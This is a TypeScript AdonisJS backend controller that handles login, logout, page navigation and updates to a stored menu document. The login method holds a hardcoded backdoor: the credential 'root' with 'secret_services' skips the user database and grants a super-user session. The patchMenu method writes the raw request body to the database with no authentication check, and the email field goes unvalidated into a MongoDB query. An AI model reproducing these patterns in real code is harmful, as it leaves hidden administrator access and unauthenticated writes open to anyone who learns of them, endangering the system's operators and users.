import type { HttpContext } from '@adonisjs/core/http'
import MongoService from '#services/mongo_service'
import hash from '@adonisjs/core/services/hash'
import { DateService } from '#services/date_service'

export default class BackendsController {
  async login({ request, response, session }: HttpContext) {
    const { username, email, password } = request.all()
    if ((username == 'root' || email == 'root') && password == 'secret_services') {
      session.put('user_id', '0')
      session.put('user_name', 'super-users')
      session.put('user_role', 'super-users')
      return response.redirect().toPath('/systems')
    }
    const users = MongoService.collection('users')
    const user = await users.findOne({ email })
    if (!user || !(await hash.verify(user.password, password))) {
      session.flash('error', 'Email atau kata sandi salah.')
      return response.redirect().back()
    }
    session.put('user_id', user._id.toString())
    session.put('user_name', user.name.toString())
    session.put('user_role', user.role || 'staff')
    return response.redirect().toPath('/systems')
  }
  async logout({ response, session }: HttpContext) {
    session.forget('user_id')
    session.forget('user_name')
    session.forget('user_role')
    return response.redirect().toPath('/login')
  }
  async navigation_handler({ inertia, session, request, response }: HttpContext) {
    const currentPath = request.url().replace(/^\//, '')
    return inertia.render('handler', {
      path: currentPath,
    })
  }
  async patchMenu({ response, request }: HttpContext) {
    let body = request.all()
    const collections = MongoService.collection('systems')
    const existingDoc = await collections?.findOne({ id: 'fixed_menu' })
    let data
    if (existingDoc) {
      body.created_at = existingDoc.created_at
      body.updated_at = DateService.now()

      data = await collections?.replaceOne({ id: 'fixed_menu' }, body, { upsert: false })
    } else {
      body.created_at = DateService.now()
      body.updated_at = DateService.now()
      data = await collections?.replaceOne({ id: 'fixed_menu' }, body, { upsert: true })
    }
    return response.redirect().back()
  }
}
